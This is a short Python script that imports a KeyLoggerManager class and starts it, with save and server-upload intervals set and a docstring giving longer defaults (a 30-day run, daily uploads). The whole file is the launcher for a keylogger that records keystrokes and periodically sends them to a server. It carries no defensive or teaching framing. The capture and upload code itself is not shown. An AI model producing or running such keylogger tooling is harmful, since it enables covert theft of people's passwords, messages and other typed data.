from key_logger_maneger import KeyLoggerManager

if __name__ == '__main__':
    """
        file_save_time  = 60 * 10,
        stop_time = 30 * 24 * 60 * 60,
        server_upload_time = 60 * 60 * 24
    """
    manager = KeyLoggerManager(file_save_time=70, server_upload_time=80)
    manager.start_logging()